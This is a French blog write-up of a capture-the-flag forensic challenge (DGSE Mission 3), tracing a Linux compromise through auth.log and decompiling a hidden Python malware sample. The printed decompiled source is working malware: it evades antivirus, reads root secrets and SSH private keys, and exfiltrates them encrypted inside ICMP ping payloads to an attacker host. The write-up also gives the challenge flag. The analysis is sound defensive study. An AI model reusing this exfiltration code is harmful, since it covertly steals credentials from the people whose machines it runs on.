---
title: DGSE CTF - Mission 3 (Forensic)
date: 2025-04-27 14:20:00 +0800
categories: [DGSE CTF]
tags: [dgse, rootme, forensic]
image:
  path: /assets/img/20250427/mission-03-statement.png
  alt: Brief de la mission 3.
---

## 🔍 Reconnaissance

J'ai commencé par analyser la VM avec **Autopsy**, on découvre dans `home` un répertoire `tempuser` dans lequel il n'y a pas grand chose d'intéréssant et un répertoire `johndoe`.

Dans le répertoire de l'utilisateur `johndoe`, on constate que le fichier `.bash_history` a été supprimé, probablement par l’attaquant dans le but de dissimuler ses activités. On remarque cependant le fichier `.sudo_as_admin_successful`. Ce fichier est créé automatiquement lors de la première exécution réussie de sudo par l'utilisateur, ce qui indique qu’une élévation de privilèges a eu lieu.

## 🚪 Piste de l'élévation de privilèges

Si une élévation de privilèges à bien eu lieu, il serait intéréssant d'analyser le fichier `/var/log/auth.log`.
Voici son contenu :
```plaintext
2025-03-25T04:51:12.096804-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T04:51:12.102069-04:00 UXWS112 sudo:  johndoe : TTY=pts/0 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/bin/systemctl start auditd rsyslog
2025-03-25T04:51:12.102430-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T04:51:12.143940-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T04:51:19.669845-04:00 UXWS112 sshd[1758]: Accepted password for johndoe from 192.168.1.10 port 37772 ssh2
2025-03-25T04:51:19.670782-04:00 UXWS112 sshd[1758]: pam_unix(sshd:session): session opened for user johndoe(uid=1000) by (uid=0)
2025-03-25T04:51:19.675023-04:00 UXWS112 systemd-logind[901]: New session 4 of user johndoe.
2025-03-25T04:51:19.719430-04:00 UXWS112 sshd[1758]: pam_env(sshd:session): deprecated reading of user environment enabled
2025-03-25T04:51:20.440593-04:00 UXWS112 sshd[1542]: Received disconnect from 192.168.1.10 port 48966:11: Bye Bye
2025-03-25T04:51:20.440727-04:00 UXWS112 sshd[1542]: Disconnected from user johndoe 192.168.1.10 port 48966
2025-03-25T04:51:20.441067-04:00 UXWS112 sshd[1497]: pam_unix(sshd:session): session closed for user johndoe
2025-03-25T04:51:20.444672-04:00 UXWS112 systemd-logind[901]: Session 2 logged out. Waiting for processes to exit.
2025-03-25T04:51:20.445707-04:00 UXWS112 systemd-logind[901]: Removed session 2.
2025-03-25T04:51:27.114047-04:00 UXWS112 sshd[1820]: Accepted password for johndoe from 192.168.1.10 port 40560 ssh2
2025-03-25T04:51:27.115083-04:00 UXWS112 sshd[1820]: pam_unix(sshd:session): session opened for user johndoe(uid=1000) by (uid=0)
2025-03-25T04:51:27.130451-04:00 UXWS112 systemd-logind[901]: New session 5 of user johndoe.
2025-03-25T04:51:27.148981-04:00 UXWS112 sshd[1820]: pam_env(sshd:session): deprecated reading of user environment enabled
2025-03-25T04:51:27.879309-04:00 UXWS112 sshd[1775]: Received disconnect from 192.168.1.10 port 37772:11: Bye Bye
2025-03-25T04:51:27.879401-04:00 UXWS112 sshd[1775]: Disconnected from user johndoe 192.168.1.10 port 37772
2025-03-25T04:51:27.879737-04:00 UXWS112 sshd[1758]: pam_unix(sshd:session): session closed for user johndoe
2025-03-25T04:51:27.883030-04:00 UXWS112 systemd-logind[901]: Session 4 logged out. Waiting for processes to exit.
2025-03-25T04:51:27.884422-04:00 UXWS112 systemd-logind[901]: Removed session 4.
2025-03-25T09:01:01.601901-04:00 UXWS112 sshd[2048]: Accepted password for johndoe from 192.168.1.10 port 55494 ssh2
2025-03-25T09:01:01.605067-04:00 UXWS112 sshd[2048]: pam_unix(sshd:session): session opened for user johndoe(uid=1000) by (uid=0)
2025-03-25T09:01:01.628002-04:00 UXWS112 systemd-logind[901]: New session 6 of user johndoe.
2025-03-25T09:01:01.696536-04:00 UXWS112 sshd[2048]: pam_env(sshd:session): deprecated reading of user environment enabled
2025-03-25T09:01:37.642413-04:00 UXWS112 sudo:  johndoe : TTY=pts/1 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/bin/apt update
2025-03-25T09:01:37.648390-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T09:01:40.748027-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:03:02.402592-04:00 UXWS112 sudo:  johndoe : TTY=pts/1 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/bin/systemctl status ssh
2025-03-25T09:03:02.405054-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T09:03:02.437736-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:04:00.950614-04:00 UXWS112 sudo:  johndoe : TTY=pts/1 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/sbin/adduser tempuser --disabled-password --gecos 
2025-03-25T09:04:00.952504-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T09:04:01.148241-04:00 UXWS112 groupadd[2458]: group added to /etc/group: name=tempuser, GID=1001
2025-03-25T09:04:01.155468-04:00 UXWS112 groupadd[2458]: group added to /etc/gshadow: name=tempuser
2025-03-25T09:04:01.159213-04:00 UXWS112 groupadd[2458]: new group: name=tempuser, GID=1001
2025-03-25T09:04:01.206081-04:00 UXWS112 useradd[2464]: new user: name=tempuser, UID=1001, GID=1001, home=/home/tempuser, shell=/bin/bash, from=/dev/pts/2
2025-03-25T09:04:01.288348-04:00 UXWS112 chfn[2473]: changed user 'tempuser' information
2025-03-25T09:04:01.324414-04:00 UXWS112 gpasswd[2479]: members of group users set by root to johndoe,tempuser
2025-03-25T09:04:01.332703-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:04:03.351988-04:00 UXWS112 sudo:  johndoe : TTY=pts/1 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/sbin/deluser tempuser
2025-03-25T09:04:03.353911-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T09:04:03.574062-04:00 UXWS112 userdel[2492]: delete user 'tempuser'
2025-03-25T09:04:03.574346-04:00 UXWS112 userdel[2492]: delete 'tempuser' from group 'users'
2025-03-25T09:04:03.576685-04:00 UXWS112 userdel[2492]: removed group 'tempuser' owned by 'tempuser'
2025-03-25T09:04:03.577361-04:00 UXWS112 userdel[2492]: removed shadow group 'tempuser' owned by 'tempuser'
2025-03-25T09:04:03.577741-04:00 UXWS112 userdel[2492]: delete 'tempuser' from shadow group 'users'
2025-03-25T09:04:03.632961-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:04:20.750996-04:00 UXWS112 sudo:  johndoe : TTY=pts/1 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/bin/ls /root/.secret
2025-03-25T09:04:20.752761-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T09:04:20.759607-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:04:28.498473-04:00 UXWS112 sudo:  johndoe : TTY=pts/1 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/bin/bash
2025-03-25T09:04:28.500224-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T09:04:31.057471-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:04:31.069701-04:00 UXWS112 sudo:     root : PWD=/home/johndoe ; USER=root ; ENV=PYTHONPATH=/home/johndoe/.local/lib/python3.7/site-packages ; COMMAND=/usr/local/bin/python3.7 /opt/fJQsJUNS/.sys
2025-03-25T09:04:31.070323-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
2025-03-25T09:04:35.113119-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:04:50.681923-04:00 UXWS112 sudo:  johndoe : TTY=pts/1 ; PWD=/home/johndoe ; USER=root ; COMMAND=/usr/bin/ls /root/.secret
2025-03-25T09:04:50.683011-04:00 UXWS112 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by johndoe(uid=1000)
2025-03-25T09:04:50.689732-04:00 UXWS112 sudo: pam_unix(sudo:session): session closed for user root
2025-03-25T09:05:01.436814-04:00 UXWS112 CRON[3245]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
2025-03-25T09:05:01.463177-04:00 UXWS112 CRON[3244]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
2025-03-25T09:05:01.464473-04:00 UXWS112 CRON[3243]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
2025-03-25T09:05:01.464784-04:00 UXWS112 CRON[3246]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
2025-03-25T09:05:01.465081-04:00 UXWS112 CRON[3247]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
2025-03-25T09:05:01.465871-04:00 UXWS112 CRON[3245]: pam_unix(cron:session): session closed for user root
2025-03-25T09:05:01.466229-04:00 UXWS112 CRON[3244]: pam_unix(cron:session): session closed for user root
2025-03-25T09:05:01.466732-04:00 UXWS112 CRON[3247]: pam_unix(cron:session): session closed for user root
2025-03-25T09:05:01.467042-04:00 UXWS112 CRON[3243]: pam_unix(cron:session): session closed for user root
2025-03-25T09:05:01.467235-04:00 UXWS112 CRON[3246]: pam_unix(cron:session): session closed for user root
2025-03-28T09:56:55.767246-04:00 UXWS112 polkitd[899]: Loading rules from directory /etc/polkit-1/rules.d
2025-03-28T09:56:55.768053-04:00 UXWS112 polkitd[899]: Loading rules from directory /usr/share/polkit-1/rules.d
2025-03-28T09:56:55.804605-04:00 UXWS112 polkitd[899]: Finished loading, compiling and executing 11 rules
2025-03-28T09:56:55.806400-04:00 UXWS112 polkitd[899]: Acquired the name org.freedesktop.PolicyKit1 on the system bus
2025-03-28T09:56:55.828275-04:00 UXWS112 systemd-logind[903]: New seat seat0.
2025-03-28T09:56:55.829958-04:00 UXWS112 systemd-logind[903]: Watching system buttons on /dev/input/event1 (Power Button)
2025-03-28T09:56:55.830020-04:00 UXWS112 systemd-logind[903]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)
``` 
Dans ces logs on voit que johndoe à : 
- crée puis supprimé **tempuser**
- listé le contenu de `/root/.secret`
- lancé un fichier avec python `/opt/fJQsJUNS/.sys`

Intéréssons nous à ce dernier fichier : 

![Desktop View](/assets/img/20250427/mission-03-autopsy-python.png){: width="572" height="400" }
_Fichier /opt/fJQsJUNS/.sys_

A première vue, ce fichier semble être un fichier python compilé (pyc) dans lequel on apercoit des références à `b64decode` ou bien encore à la librairie `Crypto.Cipherr`. Il semble aussi contenir des chemins de fichiers sensibles comme `/root/.secretz`, `~/.ssh/id_rsaz` et `/root/.ssh/id_rsa`. Ce fichier très suspect semble avoir été compilé depuis le fichier `nightshade.py`.

## ⚙️ Analyse du fichier python compilé

On extrait depuis Autopsy le fichier `.sys` qu'on renomme en `nightshade.pyc` puis on decompile ce fichier :  

```bash
$ decompyle3 -o . nightshade.pyc
```

voici le fichier `nightshade.py` décompilé : 
```python
# decompyle3 version 3.9.2
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 3.10.11 (main, Apr 14 2025, 20:58:05) [GCC 14.2.0]
# Embedded file name: nightshade.py
# Compiled at: 2025-03-24 16:04:51
# Size of source mod 2**32: 2358 bytes
import os, subprocess, psutil, base64
from Crypto.Cipher import AES
__k = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
__v = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")
__d = "37e0f8f92c71f1c3f047f43c13725ef1"

def __b64d(s):
    return base64.b64decode(s.encode()).decode()


def __p(x):
    return x + bytes([16 - len(x) % 16]) * (16 - len(x) % 16)


def __u(x):
    return x[:-x[-1]]


def __x(h):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return __u(c.decrypt(bytes.fromhex(h))).decode()


def __y(s):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return c.encrypt(__p(s.encode())).hex()


def __chk_vm():
    return False


def __chk_av():
    targets = [
     b'Y2xhbWQ=',b'YXZnZA==',b'c29waG9z',b'RVNFVA==',b'cmtodW50ZXI=']
    try:
        for p in psutil.process_iter(attrs=["name"]):
            n = (p.info["name"] or "").lower()
            for b64av in targets:
                if base64.b64decode(b64av).decode().lower() in n:
                    print("ERR AV")
                    return True

    except:
        pass

    return False


def __exf(path, dst, size=15):
    if not os.path.exists(path):
        return False
    d = open(path, "rb").read()
    segs = [d[i:i + size] for i in range(0, len(d), size)]
    for seg in segs:
        try:
            payload = AES.new(__k, AES.MODE_CBC, __v).encrypt(__p(seg)).hex()
            cmd = [__b64d("cGluZw=="), __b64d("LWM="), __b64d("MQ=="), __b64d("LXA="), payload, dst]
            subprocess.run(cmd, stdout=(subprocess.DEVNULL), stderr=(subprocess.DEVNULL))
        except:
            continue

    return True


def __main():
    if __chk_vm():
        return
    if __chk_av():
        return
    __kll = [
     "/root/.secret",
     os.path.expanduser("~/.ssh/id_rsa"),
     "/root/.ssh/id_rsa"]
    for f in __kll:
        if os.path.exists(f):
            __exf(f, __x(__d))

    _kkoo = "/root/.secret"
    if os.path.exists(_kkoo):
        try:
            os.remove(_kkoo)
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e


if __name__ == "__main__":
    __main()

# okay decompiling /home/kali/Bureau/nightshade.pyc
```

Le script importe plusieurs modules (os, subprocess, psutil, base64, Crypto.Cipher.AES) et définit :

- une clé AES `(__k)`,
- un vecteur d’initialisation `(__v)`,
- une chaîne chiffrée `(__d)`

`__b64d()` décode une chaîne base64 en texte.

`__p()` et `__u()` sont des fonctions de padding/dépadding PKCS7 pour les blocs AES.

`__x()` déchiffre une chaîne hexadécimale avec AES CBC.

`__y()` chiffre une chaîne en AES CBC puis encode le résultat en hexadécimal.

`__chk_av()` semble détecter si des processus liés à des antivirus connus sont actifs.

La fonction la plus intéréssante est `__exf()`, cette fonction lit un fichier binaire, découpe son contenu en segments de 15 octets, chiffre chaque segment en AES CBC, puis l’envoie à distance via une commande ping (ICMP), dont les arguments sont construits à partir de chaînes encodées en base64 : 

```python
cmd = ["ping", "-c", "1", "-p", payload, destination]
```
Cela envoie les données chiffrées dans la payload des paquets ICMP vers l’IP cible.

Finalement la fonction principale `__main()`

- Ignore l’exécution si une VM ou un antivirus est détecté.

- Cherche à exfiltrer les fichiers suivants (s’ils existent) :

    - `/root/.secret`

    - `~/.ssh/id_rsa (clé privée SSH)`

    - `/root/.ssh/id_rsa`

- Ces fichiers sont transmis en paquets ICMP à l’adresse déchiffrée depuis `__d`.

- Enfin, si le fichier `/root/.secret` existe encore, il est supprimé.

Puisque l’on a la clé `(__k)`, le vecteur d’initialisation `(__v)` et que l’on sait que le chiffrement utilisé est **AES** en **mode CBC** avec du **padding PKCS#7**, on peut déchiffrer la variable `__d`
```python
from Crypto.Cipher import AES

# Clé et IV extraits du script nightshade.py
key = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
iv = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")

# Donnée chiffrée (__d)
ciphertext = bytes.fromhex("37e0f8f92c71f1c3f047f43c13725ef1")

# Fonction de déchiffrement avec dépadding PKCS#7
def unpad(x):
    return x[:-x[-1]]

def decrypt_d(ciphertext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    return unpad(plaintext).decode()

# Affichage de la donnée déchifrée
print(decrypt_d(ciphertext))
```

Et voici le résultat : 
```bash
$ python3 decrypt.py 
vastation.null
```

Les données sont donc envoyées à `vastation.null`. En regardant dans le fichier `/etc/hosts` on voit que `vastation.null` est mappé localement à `192.168.1.10`

![Desktop View](/assets/img/20250427/mission-03-autopsy-hosts.png){: width="572" height="400" }
_/etc/hosts_

Ces informations vont nous permettre de mieux investiguer la capture réseau qu'on nous a fourni.

## 🌐 Analyse de la capture réseau

On va donc chercher dans la capture réseau les paquets **ICMP** envoyés vers `192.168.1.10` : 

![Desktop View](/assets/img/20250427/mission-03-wireshark.png){: width="572" height="400" }
_capture réseau filtrée_

Voici la première donnée dissimulée dans ces paquets ICMP : 
```
a08508333fbef26b26cd9e17100edf59a08508333fbef26b26cd9e17100edf59a08508333fbef26b
```

Lors de l’analyse du script malveillant `nightshade.py`, on constate que les fichiers exfiltrés sont chiffrés par blocs de **15 octets**, avec l’algorithme **AES** en **mode CBC**. Or, **AES** nécessite des blocs de **16 octets** : chaque segment est donc complété **(padding PKCS#7)**, puis chiffré en un bloc de **16 octets**.

Ce bloc chiffré est ensuite encodé en hexadécimal :
**16 octets = 32 caractères hexadécimaux**

Ici la séquence `a08508333fbef26b26cd9e17100edf59` (32 caractères) est répétée à l’identique. Cela signifie que le même bloc AES chiffré a été envoyé plusieurs fois, probablement pour éviter toute perte de données lors de la transmission ICMP.

Regardons ce que l'on obtient si on essaye de déchiffrer cette séquence : 

```python
from Crypto.Cipher import AES

# Clé et IV extraits du script nightshade.py
key = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
iv = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")

# Donnée du premier paquet ICMP
ciphertext = bytes.fromhex("a08508333fbef26b26cd9e17100edf59")

# Fonction de déchiffrement avec dépadding PKCS#7
def unpad(x):
    return x[:-x[-1]]

def decrypt_d(ciphertext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    return unpad(plaintext).decode()

# Affichage de la donnée déchifrée
print(decrypt_d(ciphertext))
```
```bash
$ python3 decrypt.py
RM{986b8674b18e
```

On obtient ce qu'il semble être la première partie du Flag !
Si on répete l'operation sur les deux paquets suivants et qu'on concatène les trois chaînes nous obtenons notre Flag !


`Flag : RM{986b8674b18e7f3c36b24cf8c8195b36bba01d61}`